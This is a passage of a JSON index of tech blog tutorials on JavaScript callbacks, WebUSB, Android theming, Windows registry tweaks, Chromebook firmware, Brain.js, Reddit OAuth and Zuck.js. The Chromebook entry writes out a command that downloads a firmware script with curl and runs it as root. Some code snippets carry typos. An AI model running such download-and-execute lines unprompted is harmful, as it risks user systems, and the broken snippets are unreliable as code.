target=\"blank\" rel=\"noopener\"new ES6 arrow functions/a). I could have also passed in a named function that I defined somewhere in the file. Finally, in this anonymous function I handle the callback (called in my return callbackFunction() ) and print out console.log (&#8216;C&#8217;)&#8217; Below is the final code:\n\nThe true power of callbacks really shine when you are dealing with multiple network request and you have a chain of execution happening. That will be covered in a later tutorial. You can a href=\"https://github.com/DaveBben/dave-bennett-youtube-development-channel/tree/master/callbacks%20and%20promises\" target=\"_blank\" rel=\"noopener\"view this final code on GitHub/a. In the next tutorial, we&#8217;ll take a look at how to deal with promises.\n\n{{ ad }}\n\n",
        "tags": [
            "callback",
            "callback function",
            "javascript"
        ]
    },
    {
        "uri": "/javascript-read-usb/",
        "title": "JavaScript Read USB",
        "content": "\nYou can now officially use JavaScript to read USB devices that are connected to your computer. This is using the new a href=\"https://wicg.github.io/webusb/\" target=\"_blank\" rel=\"noopener noreferrer\"WebUSB API/a that is still in early draft. As being so, the API could later change or be removed altogether until it receives the final verification.\n\nIn order to use WebUSB you need to be running the latest version of Google Chrome, with the experimental web platform features flag enabled. To enable it, type in chrome://flags/#enable-experimental-web-platform-features in your address bar and enable the highlighted option.\n\na href=\"https://jsdeveloper.io/javascript-read-usb/\" target=\"_blank\" rel=\"noopener\"This post has been moved to Jsdeveloper.io/a\n\n&nbsp;\n\n\\\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n",
        "tags": [
            "api",
            "development",
            "javascript",
            "webusb"
        ]
    },
    {
        "uri": "/dark-theme-any-app/",
        "title": "Dark Theme any App",
        "content": "I absolutely love dark themes in my apps. Not only is it easier on the eyes, but having a true amoled black theme a href=\"https://www.androidcentral.com/heres-thing-about-dark-themes-and-battery-savings\" target=\"blank\" rel=\"noopener\"could save you battery life/a on certain devices like the Galaxy S8. Unfortunately, not every app comes with a dark theme option. So if you want to dark theme any app on your device you will need to use the theme engine called a href=\"https://play.google.com/store/apps/details?id=projekt.substratum\" target=\"blank\" rel=\"noopener\"Substratum/a. Substratum could give you a dark theme Instagram, dark them Facebook, dark theme Inbox, etc. On most devices, you will need root in order to use Substratum. However, if you&#8217;re using a Galaxy S8 you could use this without root if you a href=\"https://play.google.com/store/apps/details?id=projekt.sungstratum\" target=\"_blank\" rel=\"noopener\"buy the Samsung Integration/a.\n\n{{ ad }}\n\nDark Theme Any App\n\nTo begin, make sure you downloaded a href=\"https://play.google.com/store/apps/details?id=projekt.substratum\" target=\"blank\" rel=\"noopener\"Substratum/a from the Play Store. Again, you need root in order to use this (except if you&8217;re using a Galaxy S8). For Galaxy S8 users, you will also need to purchase the a href=\"https://play.google.com/store/apps/details?id=projekt.sungstratum\" target=\"blank\" rel=\"noopener\"Samsung Integration app/a. The theme that I will be using is called a href=\"https://play.google.com/store/apps/details?id=com.brit.swiftblack.layers\" target=\"_blank\" rel=\"noopener\"Swift Dark/a. Theming an app is easy, open up Substratum and select the theme. Then select the device you&#8217;re using. Finally, select the app that you want to theme and hit install. If you don&#8217;t have unknown sources enabled in your settings, you might need to do that first.\n\nFor the changes to take effect, force stop the app that you themed in your settings menu, then relaunch the app. You should now see everything in black! I personally tested this using Instagram, Facebook and Google Inbox. Unfortunately, I could not get Snapchat to apply the dark theme.\n",
        "tags": [
            "android",
            "dark theme",
            "engine",
            "instagram",
            "mods"
        ]
    },
    {
        "uri": "/stop-windows-from-compressing-wallpaper/",
        "title": "Stop Windows from Compressing Wallpaper",
        "content": "By default, Windows compresses your desktop wallpaper by up to 85% of its original quality. This is done to maximize performance because most people don&#8217;t need a 50 MB image eating up precious RAM. There are two methods that you can use to stop Windows from compressing wallpapers. The first (unconfirmed) method is to use a PNG image file. There have been some reports that on the latest Windows 10 Creator&#8217;s update, PNG images are immune to Windows compression. The second method is to add a value in the Windows registry.\n\n{{ ad }}\n\nUsing Windows Registry\n\nTo open up the Windows registry,* *hold down the Windows Key + R. **This will bring up the Windows run box. From there type in **Regedit.\n\nThe first thing you should do is to make a backup of your registry just in case anything goes wrong. To do this, go to File &8211; Export.\n\nNow, let&#8217;s add the necessary key to your registry. Go to the following location:\n\npreComputer\\HKEYCURRENTUSER\\Control Panel\\Desktop/pre\n\nRight click on the folder that says *Desktop *and create a new *DWORD(32 bit value). *\n\nCall this value JPEGImportQuality **and set the base to **decimal and the value at *100. *\n\nThen click okay to apply the changes. Afterwards, reboot your computer and re-apply your wallpaper. The differences will be very nuanced, but your wallpaper will no longer have the compression.\n\n**In your sync settings, if you have your Windows theme synced, you should turn this off. Otherwise, Windows will continue to apply compression to save bandwidth when syncing to other Windows devices.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/09/regedit.png\n [2]: http://localhost/wordpress/wp-content/uploads/2017/09/backup-registry.png\n [3]: http://localhost/wordpress/wp-content/uploads/2017/09/dword-32-bit-value.png\n [4]: http://localhost/wordpress/wp-content/uploads/2017/09/jpegimagequality.png\n",
        "tags": [
            "compressing",
            "wallpaper",
            "windows"
        ]
    },
    {
        "uri": "/run-os-chromebook/",
        "title": "Run any OS on Chromebook",
        "content": "If Chrome OS is not fulfilling your needs, all hope isn&#8217;t lost. You can run any OS on a Chromebook as long as it has an x86 processor (Chromebooks with an Intel Processor). That means you can run Windows on your Chromebook or even run Mint Linux on your Chromebook.\n\ndiv class=\"alert alert-warning\"\n  bYou will need to have developer a href=\"https://www.davebennett.tech/developer-mode-chromebook/\" target=\"_blank\" rel=\"noopener\"mode enabled on your Chromebook/a/b\n/div\n\nRun Any OS on Chromebook\n\nIn order to run any OS on your Chromebook, you will have to enable the legacy bios with USB booting. Luckily, the developer over at a href=\"https://mrchromebox.tech/\" target=\"_blank\" rel=\"noopener\"MrChromebox.tech/a developed a simple script that will install replace your existing bios with the legacy bios and enables USB booting. To get started, open up your terminal by holding down CRTL + ALT + T. Inside of terminal, type in shell. Then type in the following to download and execute the script:\n\nprecd; curl -LO https://mrchromebox.tech/firmware-util.sh && sudo bash firmware-util.sh/pre\n\nOn the following screen that appears, type in *1 *to execute the first option which is to *Install/Update RW_LEGACY Firmware. *Then type in *y *to confirm the option.\n\n{{ ad }}\n\n USB Booting\n\nIf you executed the above, then USB booting will already be enabled. All you have to do is insert a bootable USB into your Chromebook. When you turn on your Chromebook and get to the recovery screen (the white warning screen that displays once you enabled developer mode) hold down CRTL + L to bring up your boot options. You should then see an option to boot from your USB device.\n\n&nbsp;\n\n&nbsp;\n",
        "tags": [
            "chromebook",
            "linux chromebook",
            "run any os on chromebook",
            "usb booting"
        ]
    },
    {
        "uri": "/javascript-read-usb-2/",
        "title": "JavaScript Read USB",
        "content": "\nYou can now officially use JavaScript to read USB devices that are connected to your computer. This is using the new a href=\"https://wicg.github.io/webusb/\" target=\"_blank\" rel=\"noopener noreferrer\"WebUSB API/a that is still in early draft. As being so, the API could later change or be removed altogether until it receives the final verification.\n\nIn order to use WebUSB you need to be running the latest version of Google Chrome, with the experimental web platform features flag enabled. To enable it, type in chrome://flags/#enable-experimental-web-platform-features in your address bar and enable the highlighted option.\n\n{{ ad }}\n\nimg class=\"alignnone size-full wp-image-29\" src=\"https://jsdeveloper.io/wp-content/uploads/2017/10/chrome-expiremental-platform-features-flag.png\" alt=\"\" width=\"795\" height=\"422\" /\n\n&nbsp;\n\nIt&#8217;s also worth noting that Firefox has their own a href=\"https://wiki.mozilla.org/WebAPI/WebUSB\" target=\"_blank\" rel=\"noopener noreferrer\"WebUSB API/a that is not compatible with the one Google is using.\n\nJavascript Access USB\n\nHere is the javascript code that will look for all available devices connected to your computer:\n\nprenavigator.usb.requestDevice({ filters: [] }).then(function (device) {\n\nconsole.log(device);\n\n});\n\n/pre\n\nThe code above calls the requestDevice method which looks for a specific device. If you know the a href=\"http://www.linux-usb.org/usb.ids\" target=\"_blank\" rel=\"noopener noreferrer\"vendor ID/a of your device, you can pass it in as an option to the filters array:\n\npre{ vendorId: 0x2341 }/pre\n\nI kept it blank so that it will show me all the usb devices connected to my computer. Then on the promise resolve, I log the device that the user has requested.\n\n{{ ad }}\n\n Security Limitations\n\nDue to security limitations, this code will only work on a button click or mouse movement event. Also, the WebUSB API will only work on a site that uses HTTPS connections. However, you can still test it using the usual http://localhost. Anyway, I wrapped the code inside a click event handler:\n\npredocument.querySelector('button').onclick=function () {\n\nnavigator.usb.requestDevice({ filters: [] }).then(function (device) {\n\nconsole.log(device);\n\n});\n\n};/pre\n\nThe user will see the following screen when they click the button:\n\nimg class=\"alignnone size-full wp-image-30\" src=\"https://jsdeveloper.io/wp-content/uploads/2017/10/javascript-webusb.png\" alt=\"\" width=\"955\" height=\"636\" /\n\n&nbsp;\n\n&nbsp;\n\nIf you look at the console log, you will see all the information about the connected USB devices.\n\n&nbsp;\n\nimg class=\"alignnone size-full wp-image-31\" src=\"https://jsdeveloper.io/wp-content/uploads/2017/10/javascript-usb-infor.png\" alt=\"\" width=\"732\" height=\"311\" /\n\nAs far as what you can do with it, you are going to be pretty limited. On the a href=\"https://developers.google.com/web/updates/2016/03/access-usb-devices-on-the-web\" target=\"_blank\" rel=\"noopener noreferrer\"Google developer site/a, they showed an example where the user connects to an Arduino and sends commands.\n\n[1]: https://jsdeveloper.io/wp-content/uploads/2017/10/chrome-expiremental-platform-features-flag.png\n[2]: https://jsdeveloper.io/wp-content/uploads/2017/10/javascript-webusb.png\n[3]: https://jsdeveloper.io/wp-content/uploads/2017/10/javascript-usb-infor.png\n",
        "tags": [
            "api",
            "chrome",
            "javascript"
        ]
    },
    {
        "uri": "/machine-learning-in-javascript/",
        "title": "Machine Learning in Javascript",
        "content": "There&#8217;s a good chance that you don&#8217;t think of JavaScript when you think of artificial intelligence and machine learning. Instead, you might think of Python and popular libraries like a href=\"https://www.tensorflow.org/\" target=\"blank\" rel=\"noopener\"Google&#8217;s Tensorflow./a While TensorFlow is very powerful and complex, it does require a steep learning curve. Personally, I&#8217;m just looking to get my feet wet in some simple AI programming. However, I came across a javascript library called a href=\"https://github.com/harthur-org/brain.js\" target=\"blank\" rel=\"noopener\"Brain.js/a. This library makes machine learning in javascript plausible and testable.It&#8217;s very easy to get started and works within your browser (not recommended though) and NodeJS.\n\ndiv class=\"alert alert-info\" role=\"alert\"\n  i class=\"fa fa-info-circle\" aria-hidden=\"true\"/istrong For this javascript tutorial/strong, I want to create a simple neural network that will be able to classify whether a YouTube video is popular (a hit) or boring.\n/div\n\nStart Node Project\n\nLet&8217;s start by initializing a new node project. Assuming you already have NodeJS installed, type the following in the terminal:\n\nprenpm init/pre\n\nAfter going through the package setup, begin by installing the Brain.js module:\n\nprenpm install brain.js --save/pre\n\nMake sure to include the save parameter so that it is listed in your devDependencies. Awesome, now create an index.js file in your project and you are ready to begin coding.\n\n{{ ad }}\n\nJavascript Artificial Intelligence\n\nIn your index.js file, begin by importing the brain.js module:\n\npreconst brain = require('brain.js)/pre\n\nNow we need to create a network variable. Brain.js allows you to choose between a a href=\"https://stats.stackexchange.com/questions/2213/feed-forward-and-recurrent-neural-networks\" target=\"_blank\" rel=\"noopener\"feedforward network and recurrent network/a. For this tutorial, we are just going to use a feedforward network. By default, it initializes with one hidden layer. You could specify more however that is not needed for this project.\n\nprevar net = new brain.NeuralNetwork()/pre\n\n Collecting Data\n\nBefore we dive into coding, we need to setup some common understanding. So let&#8217;s pretend that we all agree that a viral video has the following characteristics: 100k Views, 10K Comments, and 9500 Likes &#8211; all within a 24 hour period. For simplicity, we are going to label this as maximum possible input we expect to get. Likewise, we are going to say a boring video gets 0 views, 0 comments, and 0 likes. This is going to be the least possible input value we can expect. Now we can also setup different classifications for more viral videos. We could also add that 90k views, 7700 comments, and 3k likes also count as a viral video. Likewise, we could add another data point that says 100 views, 10 comments and 2 likes also count as a boring video.\n\n{{ ad }}\n\nNeural Network Training\n\nThe next thing you need to do is feed data to your network. This data should consist of inputs along with their ideal outputs. However, neural networks are very picky when it comes to their accepted data input. You can only input and output data that is an array of values consisting of the numbers between 0 and 1 (or -1 and 1 in some cases, but not Brain.js).\n\nAn acceptable input and output could match one of these examples:\n\ninput: [0], output: [1]\n\ninput:[0.5], output: [0.7]\n\ninput: {r: 1, b:0}, output: {r:0.5,b:0.2}\n\nIf we were working with strings, then we would need to find a way to encode the strings so that they satisfy the input/output requirements.\n\nSo what I need to do is normalize my data (the number of likes, views and comments).  Essentially, I want the following:\n\ninput:{views: 100000, likes: 10000, comments: 95000}, output: {popular: 1}\n\nUnfortunately, this does not satisfy the requirement and you will receive an error if you try to use those values as inputs. Therefore, we need to normalize the data. The best way to do this is put these numbers are percentages. So let&8217;s a video received 25K views. Therefore, it received 0.25  (25000/100000) views. Got it? Good! Let&#8217;s continue coding.\n\n{{ ad }}\n\nCreate an array that will hold objects of training data. I use the output of h for popular and b for boring :\n\nprevar data = [{ input: { v: 1.0, l: 1.0, c: 1.0 }, output: { h: 1 } },\n{ input: { v: 0.8, l: 0.75, c: 0.58 }, output: { h: 1 } }, //80k views, 7500 comments 5500 likes \n{ input: { v: 0.85, l: 0.9, c: 0.7 }, output: { h: 1 } },\n{ input: { v: 0.92, l: 0.83, c: 0.79 }, output: { h: 1 } },\n{ input: { v: 0.0, l: 0.0, c: 0.0 }, output: { b: 1 } },\n{ input: { v: 0.2, l: 0.34, c: 0.3 }, output: { b: 1 } },\n{ input: { v: 0.5, l: 0.1, c: 0.1 }, output: { b: 1 } },\n{ input: { v: 0.3, l: 0.3, c: 0.1 }, output: { b: 1 } },\n]/pre\n\nNow that you have the array, let&#8217;s send it to the network:\n\nprenet.train(data, { log: true });/pre\n\nIn the previous line, we sent the data array as the data for the network to train with. We also enabled logging so that we can see the output as it&#8217;s iterating.\n\nFinally, let&#8217;s test the network. I want it to predict whether a video with 25k views, 1k likes and 5k comments is popular.\n\npreconsole.log(net.run({{ v: 0.15, l: 0.1, c: 0.35 )/pre\n\nThe output I got is 95% boring and 5% hit. Therefore, this video is most likely going to be a boring video.\n\nYou can view the a href=\"https://github.com/DaveBben/YouTube/blob/master/javascript-ai-sample/example.js\" target=\"_blank\" rel=\"noopener\"full code on GitHub/a\n\n&nbsp;\n",
        "tags": [
            "ai",
            "machine learning"
        ]
    },
    {
        "uri": "/reddit-api-application-oauth-javascript/",
        "title": "Reddit API Application only OAuth in Javascript",
        "content": "\nBefore you begin developing your Reddit application, you will need to make sure that your app is authorized to access the Reddit API. Authorization is done through OAuth tokens that you receive from the Reddit server. The flow is pretty straightforward:\n\nApplication Requests Token\nApp Receives Token that&#8217;s valid for an hour\nApp makes API calls with given token\nApp request new token when the previous token expires\n\nFor this tutorial, we are going to build a simple app that grabs the new posts from a subreddit. Because we do not need any user data (profile, login, etc), we are going to simply use the a href=\"https://github.com/reddit/reddit/wiki/OAuth2\" target=\"_blank\" rel=\"noopener\"application only strategy/a. This allows us to perform the steps above without dealing with the hassle of user login.\n\n{{ ad }}\n\nClient ID\n\nBefore you get started, you need to register your app in order to retrieve a client id.  Go to the a href=\"https://www.reddit.com/prefs/apps\" target=\"_blank\" rel=\"noopener\"Reddit prefs app /apage and click the link that says are you a developer. It will ask you to fill out some basic information, then you will see the client id (it&8217;s the long string that&#8217;s posted underneath your app&#8217;s title).\n\nGrabbing Token\n\nLet&8217;s start by defining some constants in our javascript file:\n\npreconst dataStore = window.localStorage;\nconst clientID = ''; //IMPORTANT - THIS NEEDS TO BE YOUR CLIENT ID FROM YOUR APP\nconst subreddits = ['android'];/pre\n\nWe are using the a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage\" target=\"_blank\" rel=\"noopener\"HTML5 local storage API/a so that we can save the user&#8217;s token and device id to local storage, and retrieve them on subsequent API requests.\n\nLet&#8217;s begin by creating an init function that will be called on page load:\n\nprefunction init() {\n if (!dataStore.getItem('deviceID')) {\n dataStore.setItem('deviceID', getRandomID());\n console.log('Created new deivce ID');\n }\n grabStories();\n}/pre\n\nThis function checks to see if there&#8217;s a device id that already exists in local storage. If there is, we proceed to the grabStories() function. If not, it will call a function to create a random device id and set it as the string value of &#8216;deviceID&#8217; in local storage.\n\nHere&#8217;s the getRandomID() function. This is courtesy of a href=\"https://stackoverflow.com/questions/105034/create-guid-uuid-in-javascript\" target=\"_blank\" rel=\"noopener\"this post on StackOverflow/a because getting a truly random UID is a difficult task in JavaScript.\n\nprefunction getRandomID() {\n return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) =&gt; {\n let r = Math.random() * 16 | 0,\n v = c == 'x' ? r : (r & 0x3 | 0x8);\n return v.toString(16);\n });\n}/pre\n\n{{ ad }}\n\nAfter you have the init function and getRandomID function in place, create the grabStories() function. The purpose of this function is to trigger the API call to grab the posts from a predefined subreddit.\n\nprefunction grabStories() {\n if (!validToken()) {\n getAccessToken();\n } else {\n for (const i of subreddits) {\n query(i, queryCallback);\n }\n }\n}/pre\n\nThis function first checks to see if we have a valid token. For that, we use the function called validToken() defined here:\n\nprefunction validToken() {\n if (!dataStore.getItem('accessToken')) {\n return false;\n }\n\nconst currentDate = new Date();\n const expires = new Date(dataStore.getItem('expires'));\n const difference = (expires.getTime() - currentDate.getTime());\n const minutesDifference = Math.ceil(difference / (1000 * 60)); // minutes difference\n if (minutesDifference &lt; 5) {\n return false;\n }\n\nreturn true;\n}/pre\n\nThe validToken() function essentially checks to see if a valid token exists in local storage. If we do have a valid token, we check the expiration. You&#8217;ll see later that I also save the expiration time to location storage. For now, just keep it there and trust that it will work. I return false if it&#8217;s about to expire in less than 5 minutes. There&#8217;s really no concrete reason for this, I just figure, with less than five minutes left you might as while grab a new one.\n\nGoing back to the grabStories() method defined earlier, you will see that we have another function called getAccessToken(). Here&#8217;s what the function looks like:\n\nprefunction getAccessToken() {\n $.ajax({\n type: 'post',\n url: 'https://www.reddit.com/api/v1/access_token',\n dataType: 'json',\n headers: {\n Authorization: Basic ${btoa(${clientID}: + '')},\n },\n data: { granttype: 'https://oauth.reddit.com/grants/installedclient', device_id: dataStore.getItem('deviceID') },\n success(data) {\n if (data.access_token) {\n dataStore.setItem('accessToken', data.access_token);\n dataStore.setItem('expires', new Date().addHours((data.expires_in) / 3600));\n grabStories();\n }\n },\n error(err) {\n console.log(err);\n },\n });\n}/pre\n\nThis function might look complicated, but it&#8217;s not. Essentially, it&#8217;s just a call to the Reddit API to retrieve an access token. You will get back a json response that will contain the access_token and the amount of seconds that the token is valid for. Usually, this time is 3600 seconds (or one hour). However, it&#8217;s never safe to assume that this will always be the case. So I create a new date in the future that&#8217;s the current time plus the expiration in seconds time and save this to local storage. For this, I added a prototype function to the Date object called addHours.\n\n{{ ad }}\n\nAgain, thanks to a href=\"https://stackoverflow.com/questions/1050720/adding-hours-to-javascript-date-object\" target=\"_blank\" rel=\"noopener\"Stackoverflow/a for this because dealing with dates in Javascript is a mess:\n\ndiv\n  preDate.prototype.addHours = function (h) {\n\nthis.setTime(this.getTime() + (h6060\\*1000));\n\nreturn this;\n\n};/pre\n\n/div\n\nSo like I mention above, I add the expiration time (that 3600 seconds returned from the redditt json response) to the current time and save that to a key called &#8220;expires&#8221; in location storage. I then use this value when figuring out if the token is about to expire.\n\nSo returning back to my grabStories() function, assuming that we have an access token and it&#8217;s valid, we can proceed to the query function:\n\npre/**\n Queries the reddit api for a specific subreddit\n @param {* string - subrredit name} subreddit \n @param {*function - callback function} callback \n */\nfunction query(subreddit, callback) {\n const url = https://oauth.reddit.com/r/${subreddit}/new;\n $.ajax({\n type: 'get',\n url,\n dataType: 'json',\n headers: {\n Authorization: Bearer ${dataStore.getItem('accessToken')},\n },\n success(data) {\n callback(data);\n },\n error(err) {\n console.log(err);\n },\n });\n}/pre\n\nThis function basically calls the Reddit API with a specific subreddit. The reddit api will return all the new post from that particular subreddit. Pay attention to the Authorization that you must use. It&#8217;s basically an encoding og your access token. On success, I trigger a callback function that I pass to the query function.\n\nGoing back to the grabStories() function one last time, you will see that I pass in a function called queryCallback(). This function essentially just writes the title of each post obtained from the json data to the page:\n\npre/**\n Write the data to page\n @param {*} data - json object\n */\nfunction queryCallback(data) {\n const list = document.createElement('ul');\n const posts = data.data.children;\n posts.forEach((element) =&gt; {\n const item = document.createElement('li');\n item.innerHTML = element.data.title;\n list.appendChild(item);\n });\n document.body.appendChild(list);\n}/pre\n\nThat&#8217;s it! When you run the program, your output should look like the following:\n\nimg class=\"alignnone wp-image-16 size-large\" src=\"https://jsdeveloper.io/wp-content/uploads/2017/10/reddit-api-print-new-post-form-subreddit-1024x517.png\" alt=\"\" width=\"640\" height=\"323\" /\n\nYou can downloada href=\"https://github.com/DaveBben/reddit-application-only-oauth/tree/master\" target=\"_blank\" rel=\"noopener\" the full project on GitHub./a\n\n[1]: https://jsdeveloper.io/wp-content/uploads/2017/10/reddit-api-print-new-post-form-subreddit.png\n",
        "tags": [
            "reddit",
            "REST",
            "javascript"
        ]
    },
    {
        "uri": "/snapchat-using-javascript/",
        "title": "Snapchat using Javascript – Zuck.js",
        "content": "\nStories! Stories are everywhere these days. Snapchat, Instagram, Facebook, Facebook Messenger and Whatsapp all have stories. Hell, it&#8217;s only a matter of time before Microsoft Excel gets a stories update.\n\n&nbsp;\n\nimg class=\"alignnone size-full wp-image-24\" src=\"https://jsdeveloper.io/wp-content/uploads/2017/10/C7dfS_CWwAAFL4A.jpg\" alt=\"\" width=\"708\" height=\"290\" /\n\nIn any case, if you want to build an app like Snapchat or build an app like Instagram, there is an easy way to do so. The focus of this tutorial will be about building the story functionality of Snapchat and Instagram into an app. We&#8217;ll save the whole disappearing message thing for a later date.\n\nOkay, so you might be thinking that this is going to be a whole lot of work. Guess what? It&#8217;s not. This is all thanks to an amazing open source library on GitHub called Zuck.js.\n\n{{ ad }}\n\na href=\"https://github.com/ramon82/zuck.js/\" target=\"_blank\" rel=\"noopener\"Zuck.js/a\n\nZuck.js is a javascript library that easily allows you to add stories into an app. It already comes ready to handle opening stories, cube animation effects and giving you the clean Instagram or Snapchat look. It really makes building stories super easy to do! So because this is a javascript library, we are going to build a webapp that can run in the phone&8217;s browser. It&#8217;s going to be very basic and look something like this:\n\nimg class=\"alignnone wp-image-25 size-medium\" src=\"https://jsdeveloper.io/wp-content/uploads/2017/10/build-an-app-like-snapchat-169x300.png\" alt=\"\" width=\"169\" height=\"300\" /\n\n&nbsp;\n\n&nbsp;\n\nSetting up the HTML\n\nTo get started, let&8217;s create a basic HTML file:\n\ndiv\n  pre&lt;!DOCTYPE html&gt;\n\n&lt;!--[if lt IE 7]&gt; &lt;html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"&gt; &lt;![endif]--&gt;\n\n&lt;!--[if IE 7]&gt; &lt;html class=\"no-js lt-ie9 lt-ie8\"&gt; &lt;![endif]--&gt;\n\n&lt;!--[if IE 8]&gt; &lt;html class=\"no-js lt-ie9\"&gt; &lt;![endif]--&gt;\n\n&lt;!--[if gt IE 8]&gt;&lt;!--&gt;\n\n&lt;html class=\"no-js\"&gt;\n\n&lt;!--&lt;![endif]--&gt;\n\n&lt;head&gt;\n\n&lt;metacharset=\"utf-8\"&gt;\n\n&lt;metahttp-equiv=\"X-UA-Compatible\"content=\"IE=edge\"&gt;\n\n&lt;title&gt;Storeis!&lt;/title&gt;\n\n&lt;metaname=\"description\"content=\"\"&gt;\n\n&lt;metaname=\"viewport\"content=\"width=device-width, initial-scale=1\"&gt;\n\n&lt;linkrel=\"stylesheet\"type=\"text/css\"href=\"./vendor/zuck.js-master/zuck.css\"&gt;\n\n&lt;linkrel=\"stylesheet\"type=\"text/css\"href=\"./vendor/zuck.js-master/skins/snapgram.css\"&gt;\n\n&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;!-- Make sure to have a div to put stories in. --&gt;\n\n&lt;divid=\"stories\"&gt;&lt;/div&gt;\n\n&lt;!-- Import the Zuck library before you import your main code --&gt;\n\n&lt;scriptsrc=\"./vendor/zuck.js-master/zuck.js\"&gt;&lt;/script&gt;\n\n&lt;scriptsrc=\"./js/main.js\"&gt;&lt;/script&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;/pre\n\n  div\n  /div\n/div\n\nMake sure that you download the Zuck js library and placed it somewhere in your project structure so that you can link to it. In this HTML file, I linked to the Zucks CSS stylesheet and the Zuck skin that I want to use. Inside the body, the only thing that I need is a div. This div will be passed to Zuck so that it can render the stories to it. Finally, I imported the Zuck javascript library then my main javascript code.\n\n{{ ad }}\n\nThe Javascript\n\nNow, in my main js file, I start by defining a function that will return an object with the properties specified:\n\ndiv\n  prefunction buildItem(id, type, length, src, preview, link, seen, time) {\n\n// Using object short-hand (id: id)\n\nreturn {\n\nid,\n\ntype,\n\nlength,\n\nsrc,\n\npreview,\n\nlink,\n\nseen,\n\ntime,\n\n};\n\n}/pre\n\n/div\n\nIn that function, I pass in a whole bunch of parameters. It then outputs an object with those parameters. Keep in mind, I am using the property shorthand. So instead of saying {id: id} it&8217;s just {id}.\n\nNext, initialize the Zuck library with the below code:\n\ndiv\n  preconst stories = new Zuck('stories', {\n\nbackNative:true,\n\nautoFullScreen:'false',\n\nskin:'Snapgram',\n\navatars:'true',\n\nlist:false,\n\ncubeEffect:'true',\n\nlocalStorage:true,\n\nstories: [],\n\n});/pre\n\n/div\n\nWhen initializing the Zuck object, make sure that the &#8216;stories&#8217; parameter matches the div id that you defined in your HTML. Afterwards, I just loaded the Zuck library with the skin I wanted and also passed in a couple of options. You can find all the available options outlined in the Zuck readme.\n\nFinally, let&#8217;s add a story to the story array. Inside of the array, add the following object:\n\ndiv\n  prestories: [\n\n{\n\nid:'vision',\n\nphoto:'https://cnet4.cbsistatic.com/img/QJcTT2ab-sYWwOGrxJc0MXSt3UI=/a66dfbb7-fdc7-11e2-8c7c-d4ae52e62bcc/android-wallpaper52560x16001.jpg',\n\nname:'Tech',\n\nlink:'',\n\nlastUpdated:1492665454,\n\nitems: [\n\nbuildItem('1', 'photo', 3, 'https://pbs.twimg.com/profileimages/782474226020200448/zDo-gAo0400x400.jpg', '', false, 1492665454),\n\nbuildItem('2', 'photo', 3, 'https://vignette4.wikia.nocookie.net/ironman/images/5/59/Robert-Downey-Jr-Tony-Stark-Iron-Man-3-Marvel-Disney.jpg/revision/latest?cb=20130611164804', '', '', false, 1492665454),\n\nbuildItem('3', 'video', 0, 'https://scontent-gru2-2.cdninstagram.com/t50.2886-16/14965218193969377722724482497862983221248n.mp4', 'https://scontent-gru2-2.cdninstagram.com/t51.2885-15/e15/105974124552461246398131360162248n.jpg', '', false, 1492665454),\n\n],\n\n}],/pre\n\n/div\n\nThis essentially will build a single story that contains three items. The items can be a mixture of photos or videos. You can also adjust the length of each story item. Zuck js works just like Snapchat and Instagram. So if the user has already seen the story (hence the seen boolean) it will automatically proceed to the next item.\n\nSo now you have everything you need for your basic Snapchat app. If you open up your Index.html file in the browser, you should see the single story listed. Clicking on it will open up the story in a viewer. From this point, you could make it more dynamic by pulling in stories from a REST endpoint or the user&#8217;s gallery if you wanted. To get this on Android or iOS simply wrap the app in a webview.\n\na href=\"https://github.com/DaveBben/Snapchat-Stories\" target=\"_blank\" rel=\"noopener\"You can download the full code on Github/a\n\n[1]: https://jsdeveloper.io/wp-content/uploads/2017/10/C7dfS_CWwAAFL4A.jpg\n[2]: https://jsdeveloper.io/wp-content/uploads/2017/10/build-an-app-like-snapchat.png\n",
        "tags": [
            "library",
            "snapchat",
            "javascript"
        ]
    },
    {
        "uri": "/run-android-nougat-on-pc/",
        "title": "Run Android Nougat on PC",
        "content": "Do you have an old computer laying around that you need to find a use for? How about running Android Nougat on your PC? The Android x86 team has successfully ported Android 7.1 over to the desktop CPU architecture. This means you can enjoy your favorite apps and games on any pc span style=\"color: #000000;\"or /spanlaptop.\n\nRun Android Nougat on PC\n\nThe first thing that you need to do is download the a href=\"http://www.android-x86.org/releases/releasenote-7-1-rc1\" target=\"blank\" rel=\"noopener\"Android Nougat x86 ISO file/a. I recommend that you download the regular a href=\"https://osdn.net/projects/android-x86/downloads/67834/android-x86-7.1-rc2.iso/\" target=\"blank\" rel=\"noopener\"32 bit ISO/a because I had trouble getting the 64 bit ISO to work. You will also need to use Rufus to create a bootable ISO.\n\nAfterwards, insert the USB into the computer that you want to run Android Nougat on and boot from the USB. In the Android grub menu, select the option to run it in live mode (unless you want to install it to your hard drive). Live mode will allow you to run Android without making any changes to your hard drive. Everything will be saved in RAM.\n\nFrom this point on, everything operates like normal Android. The over performance isn&8217;t that bad. There is some stutter and lag in certain games, but nothing too unbearable. It&#8217;s worth noting that some apps and games didn&#8217;t work either. I was successfully able to get Minecraft and YouTube working, but Goat simulator crashed instantly so YMMV.\n\n{{ ad }}\n\n&nbsp;\n\n [1]: https://rufus.akeo.ie/\n [2]: http://localhost/wordpress/wp-content/uploads/2017/10/Android-Nougat-on-PC.000017_20.Still002.jpg\n [3]: http://localhost/wordpress/wp-content/uploads/2017/10/Android-Nougat-on-PC.000035_01.Still003.jpg\n",
        "tags": [
            "android on pc",
            "android x86",
            "emulation",
            "nougat"
        ]
    },
    {
        "uri": "/multithreaded-javascript/",
        "title": "Multithreaded Javascript",
